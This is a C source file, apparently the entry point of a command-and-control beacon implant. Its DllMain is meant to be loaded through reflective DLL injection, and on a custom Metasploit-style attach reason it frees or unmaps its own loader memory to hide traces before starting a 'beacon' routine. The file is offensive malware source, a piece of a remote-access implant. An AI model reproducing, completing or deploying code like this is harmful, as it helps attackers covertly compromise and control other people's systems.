//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include "beacon.h"

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//

#define DLL_METASPLOIT_ATTACH 0x04

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	MEMORY_BASIC_INFORMATION mbi;

	switch( dwReason ) {
		case DLL_QUERY_HMODULE:
			break;
		case DLL_PROCESS_ATTACH:
			/* initialize our settings data */
			settings_init((void *)hinstDLL);
			break;
		case DLL_METASPLOIT_ATTACH:
			/* clean up our loader */
			if (setting_short(SETTING_CLEANUP) == 1 && hinstDLL != NULL) {
				/* we don't want to crash, so let's look into the type of memory we have */
				if (VirtualQuery((char *)hinstDLL, &mbi, sizeof(MEMORY_BASIC_INFORMATION))) {
					if (mbi.Type == MEM_PRIVATE)
						VirtualFree((char *)hinstDLL, 0, MEM_RELEASE);
					else if (mbi.Type == MEM_MAPPED)
						UnmapViewOfFile((char *)hinstDLL);
				}
			}

			/* start our beaconing process, please! */
			beacon(lpReserved);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
	}
	return TRUE;
}